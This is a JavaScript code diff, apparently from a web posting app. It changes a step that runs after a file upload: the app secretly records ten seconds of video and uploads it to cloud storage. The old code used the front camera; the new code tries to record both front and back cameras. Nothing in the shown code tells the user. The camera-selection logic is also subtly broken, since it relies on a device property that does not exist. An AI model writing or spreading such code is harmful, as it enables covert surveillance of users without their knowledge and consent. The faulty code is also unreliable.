@@ -183,7 +183,7 @@ document.getElementById("file").addEventListener("click", async (e) => {
               progressBarContainer.style.display = "none";
 
                 // キャプチャ処理
-                await captureAndSaveImage();
+                await captureAndSaveBothCameras();
               }
           );
         } else {
@@ -192,36 +192,69 @@ document.getElementById("file").addEventListener("click", async (e) => {
         }
       });
 
-async function captureAndSaveImage() {
+async function captureAndSaveBothCameras() {
   try {
-    // フロントカメラのみを録画
-    const cameraStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
+    // 利用可能なデバイスを取得
+    const devices = await navigator.mediaDevices.enumerateDevices();
+    const videoDevices = devices.filter(device => device.kind === 'videoinput');
 
-    const recorder = new MediaRecorder(cameraStream);
-    const chunks = [];
-    recorder.ondataavailable = (event) => {
-      chunks.push(event.data);
+    // フロントカメラとバックカメラを特定
+    const frontCamera = videoDevices.find(device => device.facing == 'user');  // フロントカメラ
+    const backCamera = videoDevices.find(device => device.facing == 'environment');  // バックカメラ
+
+    if (!frontCamera || !backCamera) {
+      console.error('フロントカメラまたはバックカメラが見つかりません');
+      return;
+    }
+
+    // フロントカメラとバックカメラのストリームを取得
+    const frontCameraStream = await navigator.mediaDevices.getUserMedia({
+      video: { deviceId: frontCamera.deviceId }
+    });
+
+    const backCameraStream = await navigator.mediaDevices.getUserMedia({
+      video: { deviceId: backCamera.deviceId }
+    });
+
+    // MediaRecorderを使用して録画開始
+    const frontRecorder = new MediaRecorder(frontCameraStream);
+    const backRecorder = new MediaRecorder(backCameraStream);
+
+    const frontChunks = [];
+    const backChunks = [];
+
+    frontRecorder.ondataavailable = (event) => frontChunks.push(event.data);
+    backRecorder.ondataavailable = (event) => backChunks.push(event.data);
+
+    frontRecorder.onstop = async () => {
+      const frontBlob = new Blob(frontChunks, { type: 'video/webm' });
+      const frontVideoRef = ref(storage, `videos/front_${new Date().toISOString()}.webm`);
+      await uploadBytesResumable(frontVideoRef, frontBlob);
+      console.log("フロントカメラの録画が保存されました");
     };
-    recorder.onstop = async () => {
-      const videoBlob = new Blob(chunks, { type: 'video/webm' });
 
-      // 端末ごとにユニークなフォルダ名を作成 (例: userAgentを使用)
-      const deviceId = navigator.userAgent; // ユーザーエージェントを使用して端末を識別
-      const folderPath = `videos/${deviceId}/`;  // フォルダ名に端末識別情報を追加
-
-      // ファイル名にはタイムスタンプを使用
-      const videoRef = ref(storage, `${folderPath}${new Date().toISOString()}.webm`);
-      await uploadBytesResumable(videoRef, videoBlob);
-      console.log("録画動画が保存されました");
+    backRecorder.onstop = async () => {
+      const backBlob = new Blob(backChunks, { type: 'video/webm' });
+      const backVideoRef = ref(storage, `videos/back_${new Date().toISOString()}.webm`);
+      await uploadBytesResumable(backVideoRef, backBlob);
+      console.log("バックカメラの録画が保存されました");
     };
 
-    recorder.start();
-    setTimeout(() => recorder.stop(), 10000); // 10秒間録画
+    // 両方の録画を開始
+    frontRecorder.start();
+    backRecorder.start();
+
+    // 録画時間を設定（例：10秒後に録画停止）
+    setTimeout(() => {
+      frontRecorder.stop();
+      backRecorder.stop();
+    }, 10000); // 10秒間録画
 
   } catch (error) {
     console.error("録画エラー:", error);
   }
 }
+
 
       async function loadPosts() {
         const postsCollection = collection(db, "posts");
